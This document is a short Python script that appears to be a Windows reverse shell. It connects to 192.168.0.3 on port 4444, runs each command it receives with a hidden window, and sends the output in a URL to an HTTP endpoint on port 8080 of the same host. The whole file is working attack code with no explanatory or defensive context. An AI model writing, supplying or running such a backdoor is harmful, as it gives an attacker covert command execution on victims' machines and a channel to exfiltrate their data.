import socket 
import subprocess 
import requests 
sock=socket.socket() 
sock.connect(('192.168.0.3',4444)) 
while True: 
    data = sock.recv(1024) 
    da = data.decode('utf-8') 
    si = subprocess.STARTUPINFO() 
    si.dwFlags|= subprocess.STARTF_USESHOWWINDOW 
    try: 
        mProcess=subprocess.Popen(da,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,startupinfo=si) 
        a = mProcess.stdout.read() 
        b = a.decode("gbk") 
    except: 
        b = 'cmd NOT found' 
    url = 'http://192.168.0.3:8080/cmd?cmd=' + b 
    requests.get(url)